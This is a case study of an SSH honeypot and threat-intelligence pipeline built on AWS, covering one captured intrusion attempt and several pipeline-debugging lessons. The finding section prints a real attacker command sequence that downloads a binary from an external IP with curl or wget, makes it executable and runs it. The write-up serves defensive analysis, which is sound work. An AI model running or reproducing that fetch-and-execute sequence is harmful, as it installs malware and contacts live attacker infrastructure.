# Case Study: Catching a Live Malware Deployment Attempt

**HoneypotIntel** is a cloud-hosted SSH honeypot and threat intelligence pipeline built on AWS. This case study walks through one real incident it caught, and how the surrounding pipeline was built and hardened to catch it.

## The setup

A [Cowrie](https://github.com/cowrie/cowrie) SSH honeypot runs on an AWS EC2 instance in `ap-south-1` (Mumbai), exposed on the public internet at port 2222. It masquerades as a real, poorly-secured SSH server — accepting any username/password combination — to lure in the automated scanners and opportunistic attackers that constantly probe the internet for exposed systems.

Every connection, login attempt, and command typed inside the fake shell is logged. A Python pipeline then:
1. Parses the raw Cowrie logs
2. Enriches every unique attacker IP against the [AbuseIPDB](https://www.abuseipdb.com/) threat intelligence API
3. Feeds the result into a custom-built dashboard for analysis

As of writing, the honeypot has been live for **18+ days**, logging **2,000+ connection attempts** from **950+ unique IPs** across **28 countries** — **85.5%** of which carry an AbuseIPDB abuse-confidence score of 90 or higher, backed by a combined **229,000+ prior abuse reports**.

## The finding

Most traffic hitting the honeypot is exactly what you'd expect from internet-wide background noise: automated bots that connect, try a handful of default credentials, and disconnect. Out of 2,000+ connections, only a small number of sessions ever went further than that — and one of them was a real, multi-stage malware deployment attempt.

**July 18, 19:49 UTC — source IP `47.237.30.186`:**

echo 1 > /dev/null && cat /bin/echo
nohup $SHELL -c "curl http://223.86.55.37:60120/linux -o /tmp/GeBtuNwHnJ;
if [ ! -f /tmp/GeBtuNwHnJ ]; then wget http://223.86.55.37:.../linux -o /tmp/GeBtuNwHnJ; fi;
echo Aa@123456 > /tmp/.opass; chmod +x /tmp/GeBtuNwHnJ && /tmp/GeBtuNwHnJ ..." &
head -c 3800636 > /tmp/6xRnuR5Fej

Breaking down what this sequence does:
- **Environment probing** — a throwaway command to check the shell actually responds like a real system before committing to the next step
- **Payload download with fallback** — attempts `curl` first, falls back to `wget` if unavailable, pulling a binary from an external host
- **Execution** — `chmod +x` followed by immediately running the downloaded file
- **Staged credential file** (`/tmp/.opass`) — consistent with malware that expects to read back a password from disk rather than hardcoding it
- **UPX packing artifacts** in the payload — [UPX](https://upx.github.io/) is a legitimate compression tool that is also very commonly used by malware authors to obfuscate binaries and evade signature-based antivirus detection

Because this ran inside Cowrie's simulated shell rather than a real system, no actual compromise occurred — the "execution" is fake, and the fetch/response is logged and contained. That's the entire point of a honeypot: it lets you observe attacker tooling and technique safely, instead of just reading about it.

## Building the pipeline

Getting to a point where a finding like this was even visible took real iteration:

- **Threat intel enrichment silently failing** — the AbuseIPDB integration had been "complete" in code for weeks but had never actually returned real data. Root cause: an invalid API key, only surfaced by testing the API directly with `curl` rather than trusting the script's own error handling.
- **Rate limits** — enriching 900+ IPs against a free-tier API (1,000 requests/day) required adding deliberate delays between requests to avoid `429` errors mid-run.
- **Cron ≠ your shell** — after wiring up daily automation via `cron`, the first scheduled run failed silently with `401` errors on every request. Cause: cron jobs run in a stripped environment that doesn't load `~/.bashrc`, so an API key that worked perfectly when run manually was invisible to the scheduled job. Fixed by declaring the key directly inside the crontab itself, then verified with a live timed test rather than waiting a full day to find out.
- **Dashboard reliability** — an early version of the dashboard would silently hang on any dataset containing blank fields, because Python's `NaN` doesn't serialize to valid JSON. Traced and fixed by forcing strict JSON serialization so bad data fails loudly instead of hanging silently.

## Stack

`Cowrie` (SSH honeypot) · `AWS EC2` · `AbuseIPDB API` (threat intelligence) · `Python` (`pandas`, `paramiko`) · `Flask` + `Plotly` (dashboard) · `cron` (scheduling)

## What's next

- Public deployment of the live dashboard
- Revisiting a Wazuh SIEM integration for correlation-rule based detection

---
*All IPs, timestamps, and log excerpts in this write-up are real data captured by the honeypot.*

